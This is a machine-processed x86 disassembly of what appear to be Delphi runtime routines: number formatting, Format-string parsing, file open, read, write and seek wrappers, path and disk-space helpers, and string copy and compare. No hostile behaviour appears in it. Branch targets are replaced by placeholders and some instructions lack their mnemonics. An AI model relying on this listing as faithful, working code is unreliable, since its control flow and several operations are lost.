add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_40833c
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408352
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408352
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408352
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408388
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_40833c
mov edx esi
pop eax
call sub_404030
add esp 0x10
pop esi
retn
sub_4083a8
or cl cl
jne sub_4083dc
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4083dc
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4083dc
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4083dc
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408474
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4083a8
mov edx esi
pop eax
call sub_404030
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_40849c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_40833c
mov edx esi
pop eax
call sub_404030
add esp 0x20
pop esi
retn
xor edx edx
sub_4084c4
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ba0
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e28
sub_408518
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ba0
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408538
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404d38
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408558
mov eax [ rw-data ]
call sub_404f68
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404f68
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f94
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f94
sub_4085e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_4080e8
test al al
je r-xdata
sub_408624
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4098a4
mov edx eax
test dl dl
je r-xdata
call sub_408558
push ebp
mov eax [ rw-data ]
call sub_404f70
mov edx eax
mov eax [ rw-data ]
call sub_4085e8
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404f70
mov edx eax
mov eax [ rw-data ]
call sub_4085e8
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4086c0
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f94
call sub_408558
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f94
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f94
jmp r-xdata
pop esi
pop ebx
retn
sub_40870c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404400
push eax
call CreateFileA
sub_408764
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404400
push eax
call CreateFileA
pop ebx
retn
sub_408790
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4087bc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4087e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408828
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404400
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4088a0
push ebx
push esi
mov esi eax
mov eax esi
call sub_404200
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c380
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4088d0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404200
mov edi eax
mov eax ebx
call sub_404400
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408bd4
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c380
cmp al 0x2
jne r-xdata
dec edi
sub_408920
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4088d0
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404460
pop edi
pop esi
pop ebx
retn
sub_408958
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4088d0
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403f40
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404460
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4089a0
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404400
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404030
add esp 0x108
pop esi
pop ebx
retn
sub_4089dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d14
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d14
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408a8c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408ab4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408ae8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404200
push eax
mov eax ebx
call sub_404400
mov edx eax
mov eax esi
pop ecx
call sub_408ab4
pop esi
pop ebx
retn
sub_408b0c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404400
mov edx eax
mov ecx edi
mov eax ebx
call sub_408ab4
pop edi
pop esi
pop ebx
retn
sub_408b2c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408b50
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b90
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408be8
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408c5c
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408a50
mov esi eax
inc esi
mov eax esi
call sub_408c3c
mov ecx esi
mov edx ebx
call sub_408a7c
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408c98
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c3a4
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408a7c
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407e28
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408d20
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_409077
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408e02
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408e4a
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408e02
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408d14
pop edx
or edx edx
je r-xdata
sub_408e02
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_409077
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408e4a
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_409077
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408c98
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408e71 ]
mov ebx ecx
sub cl 0x44
je sub_4083a8
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404168
jmp r-xdata
mov esi sub_4041c8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4083a8
sub cl 0x44
je sub_40833c
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_40833c
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4083a8
mov ecx 0x10
cmp bl 0x58
je sub_40833c
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408cf0
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409230
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40833c
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_409098
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408a50
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408d20
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4090d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408a50
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408d20
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40912c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404200
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408d20
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404030
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f40
mov eax esi
mov edx ebx
call sub_40458c
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408d20
mov edx esi
xchg edx eax
call sub_40458c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4091ec
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409230
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409504
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40932f
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409339
call sub_40932f
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4091ec
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409395
call sub_40932f
call sub_409326
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_409326
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4091ec
retn
xor ecx ecx
sub_4093d1
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_409326
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_409326
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409436
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40948a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_4093d1
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409504
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
